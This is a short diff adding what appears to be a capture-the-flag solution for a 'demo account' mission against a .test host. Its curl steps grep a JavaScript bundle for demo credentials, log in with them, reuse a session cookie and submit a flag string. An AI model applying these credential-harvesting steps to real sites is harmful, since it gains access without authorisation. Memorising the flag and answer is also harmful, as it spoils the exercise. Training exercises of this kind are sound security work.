@@ -1,0 +1,8 @@
+# Season 12, mission 3: the demo account
+curl -s https://app.coupdemain.test/equipe
+curl -s https://app.coupdemain.test/assets/app-4f2c.js | grep -i demo
+submit demo1234
+curl -d "login=demo@coupdemain.test password=demo1234" https://app.coupdemain.test/equipe
+curl -b "session=cdm-demo-7731" https://app.coupdemain.test/equipe/tableau
+submit FLAG{cdm-le-compte-de-demo-9e02}
+answer remove
